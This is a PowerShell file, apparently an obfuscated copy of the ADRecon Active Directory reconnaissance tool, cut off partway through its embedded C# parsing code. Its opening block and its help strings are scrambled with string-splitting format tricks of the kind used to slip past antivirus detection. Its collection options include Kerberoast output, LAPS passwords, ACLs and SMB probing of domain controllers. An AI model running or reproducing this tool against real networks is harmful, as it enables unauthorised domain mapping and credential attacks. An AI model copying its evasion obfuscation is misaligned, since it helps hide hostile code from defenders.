sEt-VARiABlE ("Ph"+"X7N")  ( [TYPe]("{1}{4}{3}{6}{2}{5}{0}" -F'TY','SYst','.HTtP','m.W','E','uTiLI','Eb') );SeT JGwU  ( [TYPe]("{2}{1}{0}"-f '.Gc','tem','syS')  )  ;  Set-iteM  ("V"+"aR"+"i"+"a"+"bLE:7hze") ( [type]("{8}{4}{9}{7}{3}{2}{1}{6}{5}{0}" -F 'e','STO','lLi','x','Osoft.offICE','yP','BJeCTsourcEt','L.','MICr','.InterOp.exCe')) ;   sv ("Y"+"eZPb") ( [tYpE]("{3}{0}{7}{12}{11}{9}{4}{10}{1}{6}{5}{8}{2}" -f'osO','erOP','Ss','MIcr','N','xcel.xLYe','.E','Ft.O','SNOgUe','e.I','T','c','fFI')  )  ; SEt-ITem  VaRIAble:k9W  ([TYPe]("{1}{4}{7}{5}{2}{6}{3}{8}{0}"-f'yPe','MICRoso','taBl','cE','fT.oFfIcE.I','op.exCeL.XLpiVOT','eSOUr','nter','T')  )  ;   sv P16z38  (  [type]("{8}{2}{0}{6}{5}{9}{4}{10}{3}{11}{1}{7}" -F'of','ottAbl','Os','L','L','rOp','T.OFFice.INTE','eveRsIonlist','mIcr','.Exce','.x','pIv')  ) ;    seT-ITEM  variablE:5IlU (  [TyPE]("{6}{0}{9}{7}{1}{10}{3}{2}{4}{8}{5}"-f'RO','Op.','P','.xl','IVOt','CuLAtIoN','miC','R','FIeLDcAL','sOFT.OfFIcE.INtE','EXCEL') )  ;   $7sHn  =  [TYpE]("{6}{5}{0}{1}{2}{3}{4}" -F'.INTErop.Exce','L','.XL','c','hArTTYPe','ICROSoft.oFFiCe','m') ; set-itEM  vARiABle:kFmo ([TyPE]("{0}{7}{5}{8}{1}{6}{3}{2}{4}"-f'mI','.o','lDIr','.EXCel.X','eCTiOn','O','fFiCE.INteROp','Cros','ft')  ) ;  $3wsCv  =  [Type]("{7}{8}{1}{0}{6}{9}{3}{10}{5}{2}{4}" -f 'Ce.INtE','.ofFI','co','El.x','l','w','RO','miCroS','oFt','p.EXC','Lro')  ;    sEt-VAriaBLE  Nl3gD  ([tYpE]("{12}{13}{8}{11}{0}{10}{4}{2}{5}{15}{9}{6}{1}{14}{7}{3}" -f 'c','Tcond','n','E','I','TEROp.e','forMA','oNTYp','ff','xl','E.','I','miCRo','SOft.O','ITI','xCeL.')  )  ;$AbIEjU =  [tYpE]("{6}{4}{11}{7}{9}{12}{8}{0}{5}{10}{2}{1}{3}" -F'E','Ti','TA','oN','so','lDo','MIcrO','IC','I','E.inTeROP.EXCEl.XLpI','rieN','fT.OfF','VotF');   sEt-VARIABle  ('z'+'6R')  ( [tyPE]("{3}{1}{0}{5}{6}{4}{2}{7}"-f'OFFicE.iNTeroP','cRoSoft.','or','MI','OrT','.Ex','cEl.xls','der')  ); $cauSH  =  [Type]("{0}{1}{2}{3}"-f 'SystEM','.drA','wiN','G.iMaGE'); set-iTeM vARIABLe:gs39e (  [TypE]("{0}{1}" -F 'MAt','h')) ;$b1kD=[TYpE]("{1}{0}" -F'rRaY','A')  ;   sv 9xtHC ([TYPe]("{1}{0}{2}" -f'erT','BiTCoNv','ER')  );$Y4P=  [TYpe]("{2}{1}{0}{3}"-f 'Em.ConVE','YST','S','Rt') ;  $Pxyo1  = [TyPe]("{1}{0}{4}{3}{2}{5}" -F'teM','SyS','omOb','_C','._','JeCT') ;   sEt-VarIAbLe ("Lp"+"XsiU") (  [tYPE]("{0}{1}"-f 'St','RiNg') );   $IhYJ8z= [TYpe]("{6}{10}{8}{1}{2}{0}{5}{9}{4}{7}{3}" -F 'er','CT','oryS','Y.dOmAIN','.ActIVEDIr','vI','Sy','ectOR','e','Ces','STEM.DIr') ; SET-iTEM  ('VarIAB'+'L'+'e:2gO') ( [TyPe]("{1}{8}{3}{2}{9}{5}{0}{4}{7}{6}"-F 'CeS.acTIvED','sYS','ECt','EM.dIr','Ir','i','FoReST','ecToRy.','t','orysErv') );  seT-itEM VaRiaBlE:vy3  ([tYPE]("{11}{8}{1}{9}{0}{4}{3}{6}{7}{5}{2}{10}" -f 'diR','E','Sk','VI','ecTORYsEr','TYMa','CEs.s','EcuRi','t','m.','S','SyS')  );SeT-ITEM  VarIAble:uOQPbM ( [tYpE]("{2}{3}{4}{1}{0}{5}" -f'EadIng.tHR','M.thr','sy','s','Te','EAd')) ;  set-varIABLE  1wekX  ( [tyPE]("{0}{2}{1}" -f 'iN','r','TPt') ) ;    SeT-ITEm  ("VA"+"R"+"iABlE:"+"IKw")  (  [tYPe]("{1}{2}{0}{5}{3}{6}{4}"-F '.RUntiMe','SYS','tem','es.','Hal','.INTERoPsERViC','MaRS'))  ;SV 29RW  ([TYpe]("{0}{4}{1}{2}{3}"-F 'RE','tioN.aSSeM','b','LY','fLec') )  ;$QJc=[Type]("{3}{1}{2}{0}"-F'R','YSTEM.bITCONv','ertE','S')  ;   $5E974=[TyPe]("{2}{0}{1}" -f 'OnvEr','t','C') ;  seT-VarIAbLe  ("JWB"+"18")  ([Type]("{4}{1}{0}{3}{5}{2}" -F 'wsc','AD','Ss','l','adREcoN.','A')  );$THLi4  =[TYpe]("{2}{3}{5}{0}{1}{4}" -f '.sto','pWaT','sY','stEm.diagnOsT','Ch','icS') ;    SET-IteM  VarIaBLe:s07D  (  [type]("{3}{1}{2}{0}" -f 'sS','AP','ClA','AdReCON.ld'));  sET-itEm  VARIABLe:9LQ  (  [TYpe]("{0}{2}{1}"-F'ENv','NT','iRonME')  ) ;   sV kLq (  [tYPe]("{0}{2}{5}{7}{3}{1}{6}{4}"-f's','O','YSteM.rE','Ti','bly','flE','N.asSEm','C'))  ;    $K49p=  [typE]("{0}{5}{4}{1}{7}{6}{2}{3}" -F'maNAg','a','S','cRedENtial','MEnt.','e','aTiON.p','UTOM')  ;  

[CmdletBinding()]
param
(
    [Parameter(maNdAtoRY = $false, heLpMESsAGe = {"{0}{3}{9}{2}{4}{1}{6}{5}{8}{10}{7}"-f'Whi',' (','AD','ch method t','WS','efau','d','P','lt), ','o use; ','LDA'})]
    [ValidateSet({"{1}{0}" -f 'S','ADW'}, {"{0}{1}" -f'LDA','P'})]
    [string] $Method = ("{1}{0}" -f'WS','AD'),

    [Parameter(mANdATORy = $false, HElPmessAgE = {"{9}{3}{1}{6}{11}{4}{2}{10}{5}{8}{7}{0}"-f'N.','i',' Addre','ma','roller IP',' or ','n ','QD','Domain F','Do','ss','Cont'})]
    [string] $DomainController = '',

    [Parameter(mandatory = $false, helpMeSSage = {"{5}{3}{0}{1}{4}{2}"-f'main',' Cr','ials.','o','edent','D'})]
    [Management.Automation.PSCredential] $Credential =  (  Gi  variaBLE:K49P  ).vAlue::"EM`pTy",

    [Parameter(mANDATOry = $false, heLpmESsAgE = {"{40}{23}{45}{8}{0}{35}{49}{33}{28}{32}{48}{46}{14}{43}{52}{5}{24}{16}{3}{11}{54}{25}{19}{51}{20}{53}{38}{41}{6}{39}{50}{47}{34}{15}{18}{56}{55}{31}{42}{4}{21}{27}{13}{44}{37}{26}{2}{22}{30}{1}{29}{10}{36}{12}{17}{9}{7}"-f' AD','n t',' i','e','t.x',' to g','t','n.','r','co','ost ','rat','se',' whe','i','nera','n','d to run ADRe','te the ADR','con-','epor','ls','nstalled',' ','e','e','xcel is not','x','ou','he h',' o','p','tpu','on ','ge','R','u','soft E','.',' ','Path',' Use i','or','ning the CSV fil','n Micro','fo','lder conta',' ','t fo','ec','to','R','es','t.xlsx','e the ADR','-Re','econ'})]
    [string] $GenExcel,

    [Parameter(mANDAtORy = $false, HElpmEsSage = {(("{19}{3}{1}{2}{35}{8}{15}{20}{4}{13}{31}{9}{41}{18}{36}{16}{12}{7}{0}{22}{23}{26}{29}{24}{25}{28}{40}{38}{21}{11}{37}{14}{6}{17}{10}{32}{34}{5}{39}{30}{33}{27}" -f'D',' fold','er to','put','J','n','l be crea','he A','s','N','d ','lder spe','t','S','il','ave the CS','and ','te','TML f','Path for ADRecon out','V/XML/','x. (The fo','R','eco','R','e','n','t exist)','port','-','a','O','if it d','A','oes',' ','iles ','cified w','ls','g','.x','/H'))."rEPl`ACe"('gaA',[sTRING][char]39)})]
    [string] $OutputDir,

    [Parameter(maNDAToRY = $false, heLPMeSSaGe = {("{21}{86}{110}{92}{54}{103}{1}{96}{89}{29}{51}{84}{93}{37}{30}{2}{90}{116}{114}{43}{5}{53}{8}{31}{82}{77}{45}{66}{109}{27}{98}{9}{44}{55}{17}{68}{0}{40}{73}{88}{23}{63}{25}{95}{75}{87}{107}{65}{70}{119}{15}{100}{69}{12}{76}{50}{102}{113}{72}{78}{56}{14}{7}{104}{4}{3}{83}{115}{99}{108}{26}{34}{10}{46}{48}{97}{38}{120}{91}{111}{24}{18}{16}{59}{32}{52}{13}{49}{81}{94}{6}{106}{64}{33}{57}{101}{47}{118}{41}{20}{105}{61}{62}{85}{79}{67}{22}{58}{117}{74}{19}{42}{39}{35}{36}{71}{112}{28}{80}{60}{11}"-f'lu','; C','st,Dom','P','s, UserSPNs, ',', Ke','m','rs,','eroast and','v','ute','ogon','Po','SRe','ntrolle','story','GPOs','alid ',' ',', Dom',' Bi','Wh','ort','res','Us,','oma','ri','e','forS','epa','re',' D','ks, D','ters','b','n','t',' Fo','pMem','inAccou','es include: ',',','a','ept ACLs','iceLogon)','ou','s, Gro','puterSPNs,','up','c','icy, FineGraine','r','NSZones, DN','rb','es to ru',' V','Co',', C',', K',', gPLin','L',', ACLs, G','P','t, D','u','ts, Sc','nts','p','va','word','h','sus','i','F','oast','Trusts','l','cc','cy, Domain','e','ervice','ords, Pr','omainA','a','ated','OR','ich',', Sites, Su','o',' s','ain (Default al',' ','dul','; e.g','inters, Co','in, ','omma','s, GroupChanges, Grou','r','o',', Pass','om','dPasswordP','n',' User','tLocker','p','bne','rdAtt','usedforS',' mo','O','ed','ol','c','ssw','l ex','erber',' LAPS','emaHi','bers,')})]
    [ValidateSet({"{1}{0}{2}"-f'o','F','rest'}, {"{1}{0}" -f'omain','D'}, {"{1}{0}"-f'rusts','T'}, {"{1}{0}"-f 'es','Sit'}, {"{1}{0}{2}"-f 'ubne','S','ts'}, {"{3}{2}{0}{1}" -f 'hemaHist','ory','c','S'}, {"{4}{1}{0}{3}{2}" -f 'ord','sw','icy','Pol','Pas'}, {"{5}{1}{4}{0}{2}{3}" -f'rdPol','ssw','ic','y','o','FineGrainedPa'}, {"{1}{3}{4}{5}{2}{0}" -f 's','D','ontroller','o','ma','inC'}, {"{1}{0}" -f 'sers','U'}, {"{1}{0}" -f'Ns','UserSP'}, {"{0}{2}{1}{3}{4}" -f'Pass','Attrib','word','ut','es'}, {"{1}{0}"-f'ups','Gro'}, {"{3}{2}{0}{1}" -f 'h','anges','pC','Grou'}, {"{1}{2}{0}" -f's','GroupMembe','r'}, 'OUs', {"{1}{0}"-f 'POs','G'}, {"{0}{1}" -f'g','PLinks'}, {"{0}{1}{2}"-f'DNSZo','ne','s'}, {"{2}{1}{0}"-f 'ds','ecor','DNSR'}, {"{1}{2}{0}" -f 'rs','Pri','nte'}, {"{0}{1}{2}" -f 'Comp','u','ters'}, {"{3}{2}{0}{1}" -f'PN','s','erS','Comput'}, {"{0}{1}"-f 'LAP','S'}, {"{0}{2}{1}"-f'BitL','ker','oc'}, {"{0}{1}"-f'A','CLs'}, {"{2}{1}{0}" -f 'ort','PORep','G'}, {"{0}{1}{2}"-f 'Ker','ber','oast'}, {"{0}{6}{4}{3}{5}{2}{1}"-f'D','ceLogon','ntsusedforServi','Ac','ain','cou','om'}, {"{0}{2}{1}" -f'Defa','lt','u'})]
    [array] $Collect = ("{1}{2}{0}" -f'lt','D','efau'),

    [Parameter(mANdaTOrY = $false, heLpMEssagE = {"{2}{20}{8}{18}{19}{7}{29}{30}{26}{15}{6}{14}{27}{1}{5}{9}{10}{0}{28}{11}{23}{25}{4}{12}{3}{24}{22}{17}{16}{13}{21}" -f 't S',',HTML,Ex','O','amet','t p','cel',',X','a se','t ',' (Defau','l','DO','ar','xce','ML','DOUT,CSV','and E','SV ','type;',' Comm','utpu','l)','e C','UT with -Col','er, els','lec','ST',',JSON','T','per','ated; e.g '})]
    [ValidateSet({"{1}{0}"-f'T','STDOU'}, 'CSV', 'XML', {"{1}{0}"-f'ON','JS'}, {"{1}{0}" -f'CEL','EX'}, {"{0}{1}"-f'H','TML'}, 'All', {"{2}{0}{1}"-f'efa','ult','D'})]
    [array] $OutputType = {"{2}{0}{1}"-f 'ul','t','Defa'},

    [Parameter(maNdaToRY = $false, HeLpMeSsAgE = {"{2}{4}{7}{0}{3}{6}{1}{8}{5}" -f' Dormant accoun','ault ','Times','ts. De','pan','days','f',' for','90 '})]
    [ValidateRange(1,1000)]
    [int] $DormantTimeSpan = 90,

    [Parameter(mAndATOry = $false, HELpMESsAGE = {"{5}{2}{3}{7}{0}{6}{1}{8}{4}" -f'ou',' Default 30 d','u','m ','ys','Maxim','nt password age.','machine acc','a'})]
    [ValidateRange(1,1000)]
    [int] $PassMaxAge = 30,

    [Parameter(mANdatoRY = $false, HELpMESSAGe = {"{11}{3}{4}{5}{7}{16}{0}{6}{2}{10}{1}{13}{14}{15}{8}{12}{9}"-f' ','bjec','earch','to',' set',' f','LDAP s','or th','fault ','0','er o','The PageSize ','20','t.',' ','De','e'})]
    [ValidateRange(1,10000)]
    [int] $PageSize = 200,

    [Parameter(MAndATorY = $false, HeLPmessAge = {"{7}{0}{14}{16}{5}{13}{4}{10}{12}{3}{11}{2}{1}{8}{9}{6}{17}{15}" -f'e ','bje',' o',' ',' use durin',' threa','fa','Th','cts.',' De','g proce','of','ssing','ds to','numb','0','er of','ult 1'})]
    [ValidateRange(1,100)]
    [int] $Threads = 10,

    [Parameter(mANDaTorY = $false, HElPMESSaGe = {"{7}{10}{4}{1}{5}{3}{11}{2}{6}{8}{0}{9}"-f 'r','A','i','og','te ','DRecon L','ng Start','C','-Transc','ipt','rea',' us'})]
    [switch] $Log
)

$ADWSSource = @"
// Thanks Dennis Albuquerque for the C# multithreading code
using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Xml;
using System.Threading;
using System.DirectoryServices;
//using System.Security.Principal;
using System.Security.AccessControl;
using System.Management.Automation;

using System.Diagnostics;
//using System.IO;
//using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Runtime.InteropServices;

namespace ADRecon
{
    public static class ADWSClass
    {
        private static DateTime Date1;
        private static int PassMaxAge;
        private static int DormantTimeSpan;
        private static Dictionary<string, string> AdGroupDictionary = new Dictionary<string, string>();
        private static string DomainSID;
        private static Dictionary<string, string> AdGPODictionary = new Dictionary<string, string>();
        private static Hashtable GUIDs = new Hashtable();
        private static Dictionary<string, string> AdSIDDictionary = new Dictionary<string, string>();
        private static readonly HashSet<string> Groups = new HashSet<string> ( new string[] {"268435456", "268435457", "536870912", "536870913"} );
        private static readonly HashSet<string> Users = new HashSet<string> ( new string[] { "805306368" } );
        private static readonly HashSet<string> Computers = new HashSet<string> ( new string[] { "805306369" }) ;
        private static readonly HashSet<string> TrustAccounts = new HashSet<string> ( new string[] { "805306370" } );

        [Flags]
        //Values taken from https://support.microsoft.com/en-au/kb/305144
        public enum UACFlags
        {
            SCRIPT = 1,        // 0x1
            ACCOUNTDISABLE = 2,        // 0x2
            HOMEDIR_REQUIRED = 8,        // 0x8
            LOCKOUT = 16,       // 0x10
            PASSWD_NOTREQD = 32,       // 0x20
            PASSWD_CANT_CHANGE = 64,       // 0x40
            ENCRYPTED_TEXT_PASSWORD_ALLOWED = 128,      // 0x80
            TEMP_DUPLICATE_ACCOUNT = 256,      // 0x100
            NORMAL_ACCOUNT = 512,      // 0x200
            INTERDOMAIN_TRUST_ACCOUNT = 2048,     // 0x800
            WORKSTATION_TRUST_ACCOUNT = 4096,     // 0x1000
            SERVER_TRUST_ACCOUNT = 8192,     // 0x2000
            DONT_EXPIRE_PASSWD = 65536,    // 0x10000
            MNS_LOGON_ACCOUNT = 131072,   // 0x20000
            SMARTCARD_REQUIRED = 262144,   // 0x40000
            TRUSTED_FOR_DELEGATION = 524288,   // 0x80000
            NOT_DELEGATED = 1048576,  // 0x100000
            USE_DES_KEY_ONLY = 2097152,  // 0x200000
            DONT_REQUIRE_PREAUTH = 4194304,  // 0x400000
            PASSWORD_EXPIRED = 8388608,  // 0x800000
            TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION = 16777216, // 0x1000000
            PARTIAL_SECRETS_ACCOUNT = 67108864 // 0x04000000
        }

        [Flags]
        //Values taken from https://blogs.msdn.microsoft.com/openspecification/2011/05/30/windows-configurations-for-kerberos-supported-encryption-type/
        public enum KerbEncFlags
        {
            ZERO = 0,
            DES_CBC_CRC = 1,        // 0x1
            DES_CBC_MD5 = 2,        // 0x2
            RC4_HMAC = 4,        // 0x4
            AES128_CTS_HMAC_SHA1_96 = 8,       // 0x18
            AES256_CTS_HMAC_SHA1_96 = 16       // 0x10
        }

		private static readonly Dictionary<string, string> Replacements = new Dictionary<string, string>()
        {
            //{System.Environment.NewLine, ""},
            //{",", ";"},
            {"\"", "'"}
        };

        public static string CleanString(Object StringtoClean)
        {
            // Remove extra spaces and new lines
            string CleanedString = string.Join(" ", ((Convert.ToString(StringtoClean)).Split((string[]) null, StringSplitOptions.RemoveEmptyEntries)));
            foreach (string Replacement in Replacements.Keys)
            {
                CleanedString = CleanedString.Replace(Replacement, Replacements[Replacement]);
            }
            return CleanedString;
        }

        public static int ObjectCount(Object[] ADRObject)
        {
            return ADRObject.Length;
        }

        public static Object[] DomainControllerParser(Object[] AdDomainControllers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdDomainControllers, numOfThreads, "DomainControllers");
            return ADRObj;
        }

        public static Object[] SchemaParser(Object[] AdSchemas, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdSchemas, numOfThreads, "SchemaHistory");
            return ADRObj;
        }

        public static Object[] UserParser(Object[] AdUsers, DateTime Date1, int DormantTimeSpan, int PassMaxAge, int numOfThreads)
        {
            ADWSClass.Date1 = Date1;
            ADWSClass.DormantTimeSpan = DormantTimeSpan;
            ADWSClass.PassMaxAge = PassMaxAge;

            Object[] ADRObj = runProcessor(AdUsers, numOfThreads, "Users");
            return ADRObj;
        }

        public static Object[] UserSPNParser(Object[] AdUsers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdUsers, numOfThreads, "UserSPNs");
            return ADRObj;
        }

        public static Object[] GroupParser(Object[] AdGroups, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdGroups, numOfThreads, "Groups");
            return ADRObj;
        }

        public static Object[] GroupChangeParser(Object[] AdGroups, DateTime Date1, int numOfThreads)
        {
            ADWSClass.Date1 = Date1;
            Object[] ADRObj = runProcessor(AdGroups, numOfThreads, "GroupChanges");
            return ADRObj;
        }

        public static Object[] GroupMemberParser(Object[] AdGroups, Object[] AdGroupMembers, string DomainSID, int numOfThreads)
        {
            ADWSClass.AdGroupDictionary = new Dictionary<string, string>();
            runProcessor(AdGroups, numOfThreads, "GroupsDictionary");
            ADWSClass.DomainSID = DomainSID;
            Object[] ADRObj = runProcessor(AdGroupMembers, numOfThreads, "GroupMembers");
            return ADRObj;
        }

        public static Object[] OUParser(Object[] AdOUs, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdOUs, numOfThreads, "OUs");
            return ADRObj;
        }

        public static Object[] GPOParser(Object[] AdGPOs, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdGPOs, numOfThreads, "GPOs");
            return ADRObj;
        }

        public static Object[] SOMParser(Object[] AdGPOs, Object[] AdSOMs, int numOfThreads)
        {
            ADWSClass.AdGPODictionary = new Dictionary<string, string>();
            runProcessor(AdGPOs, numOfThreads, "GPOsDictionary");
            Object[] ADRObj = runProcessor(AdSOMs, numOfThreads, "SOMs");
            return ADRObj;
        }

        public static Object[] PrinterParser(Object[] ADPrinters, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(ADPrinters, numOfThreads, "Printers");
            return ADRObj;
        }

        public static Object[] ComputerParser(Object[] AdComputers, DateTime Date1, int DormantTimeSpan, int PassMaxAge, int numOfThreads)
        {
            ADWSClass.Date1 = Date1;
            ADWSClass.DormantTimeSpan = DormantTimeSpan;
            ADWSClass.PassMaxAge = PassMaxAge;

            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, "Computers");
            return ADRObj;
        }

        public static Object[] ComputerSPNParser(Object[] AdComputers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, "ComputerSPNs");
            return ADRObj;
        }

        public static Object[] LAPSParser(Object[] AdComputers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, "LAPS");
            return ADRObj;
        }

        public static Object[] DACLParser(Object[] ADObjects, Object PSGUIDs, int numOfThreads)
        {
            ADWSClass.AdSIDDictionary = new Dictionary<string, string>();
            runProcessor(ADObjects, numOfThreads, "SIDDictionary");
            ADWSClass.GUIDs = (Hashtable) PSGUIDs;
            Object[] ADRObj = runProcessor(ADObjects, numOfThreads, "DACLs");
            return ADRObj;
        }

        public static Object[] SACLParser(Object[] ADObjects, Object PSGUIDs, int numOfThreads)
        {
            ADWSClass.GUIDs = (Hashtable) PSGUIDs;
            Object[] ADRObj = runProcessor(ADObjects, numOfThreads, "SACLs");
            return ADRObj;
        }

        static Object[] runProcessor(Object[] arrayToProcess, int numOfThreads, string processorType)
        {
            int totalRecords = arrayToProcess.Length;
            IRecordProcessor recordProcessor = recordProcessorFactory(processorType);
            IResultsHandler resultsHandler = new SimpleResultsHandler ();
            int numberOfRecordsPerThread = totalRecords / numOfThreads;
            int remainders = totalRecords % numOfThreads;

            Thread[] threads = new Thread[numOfThreads];
            for (int i = 0; i < numOfThreads; i++)
            {
                int numberOfRecordsToProcess = numberOfRecordsPerThread;
                if (i == (numOfThreads - 1))
                {
                    //last thread, do the remaining records
                    numberOfRecordsToProcess += remainders;
                }

                //split the full array into chunks to be given to different threads
                Object[] sliceToProcess = new Object[numberOfRecordsToProcess];
                Array.Copy(arrayToProcess, i * numberOfRecordsPerThread, sliceToProcess, 0, numberOfRecordsToProcess);
                ProcessorThread processorThread = new ProcessorThread(i, recordProcessor, resultsHandler, sliceToProcess);
                threads[i] = new Thread(processorThread.processThreadRecords);
                threads[i].Start();
            }
            foreach (Thread t in threads)
            {
                t.Join();
            }

            return resultsHandler.finalise();
        }

        static IRecordProcessor recordProcessorFactory(string name)
        {
            switch (name)
            {
                case "DomainControllers":
                    return new DomainControllerRecordProcessor();
                case "SchemaHistory":
                    return new SchemaRecordProcessor();
                case "Users":
                    return new UserRecordProcessor();
                case "UserSPNs":
                    return new UserSPNRecordProcessor();
                case "Groups":
                    return new GroupRecordProcessor();
                case "GroupChanges":
                    return new GroupChangeRecordProcessor();
                case "GroupsDictionary":
                    return new GroupRecordDictionaryProcessor();
                case "GroupMembers":
                    return new GroupMemberRecordProcessor();
                case "OUs":
                    return new OURecordProcessor();
                case "GPOs":
                    return new GPORecordProcessor();
                case "GPOsDictionary":
                    return new GPORecordDictionaryProcessor();
                case "SOMs":
                    return new SOMRecordProcessor();
                case "Printers":
                    return new PrinterRecordProcessor();
                case "Computers":
                    return new ComputerRecordProcessor();
                case "ComputerSPNs":
                    return new ComputerSPNRecordProcessor();
                case "LAPS":
                    return new LAPSRecordProcessor();
                case "SIDDictionary":
                    return new SIDRecordDictionaryProcessor();
                case "DACLs":
                    return new DACLRecordProcessor();
                case "SACLs":
                    return new SACLRecordProcessor();
            }
            throw new ArgumentException("Invalid processor type " + name);
        }

        class ProcessorThread
        {
            readonly int id;
            readonly IRecordProcessor recordProcessor;
            readonly IResultsHandler resultsHandler;
            readonly Object[] objectsToBeProcessed;

            public ProcessorThread(int id, IRecordProcessor recordProcessor, IResultsHandler resultsHandler, Object[] objectsToBeProcessed)
            {
                this.recordProcessor = recordProcessor;
                this.id = id;
                this.resultsHandler = resultsHandler;
                this.objectsToBeProcessed = objectsToBeProcessed;
            }

            public void processThreadRecords()
            {
                for (int i = 0; i < objectsToBeProcessed.Length; i++)
                {
                    Object[] result = recordProcessor.processRecord(objectsToBeProcessed[i]);
                    resultsHandler.processResults(result); //this is a thread safe operation
                }
            }
        }

        //The interface and implmentation class used to process a record (this implemmentation just returns a log type string)

        interface IRecordProcessor
        {
            PSObject[] processRecord(Object record);
        }

        class DomainControllerRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdDC = (PSObject) record;
                    bool Infra = false;
                    bool Naming = false;
                    bool Schema = false;
                    bool RID = false;
                    bool PDC = false;
                    PSObject DCSMBObj = new PSObject();

                    string OperatingSystem = CleanString((AdDC.Members["OperatingSystem"].Value != null ? AdDC.Members["OperatingSystem"].Value : "-") + " " + AdDC.Members["OperatingSystemHotfix"].Value + " " + AdDC.Members["OperatingSystemServicePack"].Value + " " + AdDC.Members["OperatingSystemVersion"].Value);

                    foreach (var OperationMasterRole in (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdDC.Members["OperationMasterRoles"].Value)
                    {
                        switch (OperationMasterRole.ToString())
                        {
                            case "InfrastructureMaster":
                            Infra = true;
                            break;
                            case "DomainNamingMaster":
                            Naming = true;
                            break;
                            case "SchemaMaster":
                            Schema = true;
                            break;
                            case "RIDMaster":
                            RID = true;
                            break;
                            case "PDCEmulator":
                            PDC = true;
                            break;
                        }
                    }
                    PSObject DCObj = new PSObject();
                    DCObj.Members.Add(new PSNoteProperty("Domain", AdDC.Members["Domain"].Value));
                    DCObj.Members.Add(new PSNoteProperty("Site", AdDC.Members["Site"].Value));
                    DCObj.Members.Add(new PSNoteProperty("Name", AdDC.Members["Name"].Value));
                    DCObj.Members.Add(new PSNoteProperty("IPv4Address", AdDC.Members["IPv4Address"].Value));
                    DCObj.Members.Add(new PSNoteProperty("Operating System", OperatingSystem));
                    DCObj.Members.Add(new PSNoteProperty("Hostname", AdDC.Members["HostName"].Value));
                    DCObj.Members.Add(new PSNoteProperty("Infra", Infra));
                    DCObj.Members.Add(new PSNoteProperty("Naming", Naming));
                    DCObj.Members.Add(new PSNoteProperty("Schema", Schema));
                    DCObj.Members.Add(new PSNoteProperty("RID", RID));
                    DCObj.Members.Add(new PSNoteProperty("PDC", PDC));
                    if (AdDC.Members["IPv4Address"].Value != null)
                    {
                        DCSMBObj = GetPSObject(AdDC.Members["IPv4Address"].Value);
                    }
                    else
                    {
                        DCSMBObj = new PSObject();
                        DCSMBObj.Members.Add(new PSNoteProperty("SMB Port Open", false));
                    }
                    foreach (PSPropertyInfo psPropertyInfo in DCSMBObj.Properties)
                    {
                        if (Convert.ToString(psPropertyInfo.Name) == "SMB Port Open" && (bool) psPropertyInfo.Value == false)
                        {
                            DCObj.Members.Add(new PSNoteProperty(psPropertyInfo.Name, psPropertyInfo.Value));
                            DCObj.Members.Add(new PSNoteProperty("SMB1(NT LM 0.12)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB2(0x0202)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB2(0x0210)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB3(0x0300)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB3(0x0302)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB3(0x0311)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB Signing", null));
                            break;
                        }
                        else
                        {
                            DCObj.Members.Add(new PSNoteProperty(psPropertyInfo.Name, psPropertyInfo.Value));
                        }
                    }
                    return new PSObject[] { DCObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class SchemaRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdSchema = (PSObject) record;

                    PSObject SchemaObj = new PSObject();
                    SchemaObj.Members.Add(new PSNoteProperty("ObjectClass", AdSchema.Members["ObjectClass"].Value));
                    SchemaObj.Members.Add(new PSNoteProperty("Name", AdSchema.Members["Name"].Value));
                    SchemaObj.Members.Add(new PSNoteProperty("whenCreated", AdSchema.Members["whenCreated"].Value));
                    SchemaObj.Members.Add(new PSNoteProperty("whenChanged", AdSchema.Members["whenChanged"].Value));
                    SchemaObj.Members.Add(new PSNoteProperty("DistinguishedName", AdSchema.Members["DistinguishedName"].Value));
                    return new PSObject[] { SchemaObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class UserRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdUser = (PSObject) record;
                    bool? Enabled = null;
                    bool MustChangePasswordatLogon = false;
                    bool PasswordNotChangedafterMaxAge = false;
                    bool NeverLoggedIn = false;
                    int? DaysSinceLastLogon = null;
                    int? DaysSinceLastPasswordChange = null;
                    int? AccountExpirationNumofDays = null;
                    bool Dormant = false;
                    string SIDHistory = "";
                    bool? KerberosRC4 = null;
                    bool? KerberosAES128 = null;
                    bool? KerberosAES256 = null;
                    string DelegationType = null;
                    string DelegationProtocol = null;
                    string DelegationServices = null;
                    DateTime? LastLogonDate = null;
                    DateTime? PasswordLastSet = null;
                    DateTime? AccountExpires = null;
                    bool? AccountNotDelegated = null;
                    bool? HasSPN = null;

                    try
                    {
                        // The Enabled field can be blank which raises an exception. This may occur when the user is not allowed to query the UserAccountControl attribute.
                        Enabled = (bool) AdUser.Members["Enabled"].Value;
                    }
                    catch //(Exception e)
                    {
                        //Console.WriteLine("Exception caught: {0}", e);
                    }
                    if (AdUser.Members["lastLogonTimeStamp"].Value != null)
                    {
